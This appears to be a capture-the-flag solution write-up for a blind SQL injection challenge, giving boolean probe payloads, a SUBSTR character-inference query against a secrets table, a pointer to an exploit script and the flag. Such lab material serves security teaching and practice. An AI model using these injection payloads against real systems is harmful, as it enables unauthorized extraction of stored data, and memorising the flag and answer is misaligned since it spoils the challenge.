**Solution: A09 - BLIND SQL**

**Concept**  
Boolean-based blind SQL injection and data exfiltration.

**Walkthrough**  
1. Inject Boolean conditions:
   - `admin' AND 1=1 --` -> `{"exists": true}`
   - `admin' AND 1=2 --` -> `{"exists": false}`
2. Construct character inference queries:
   `admin' AND SUBSTR((SELECT secret_val FROM secrets LIMIT 1), 1, 1) = 'b' --`
3. Run `challenge/app/exploit_demo.py` to extract all characters.
4. Output: `flag{blind_sql_inference}`.

**Flag**  
`flag{blind_sql_inference}`
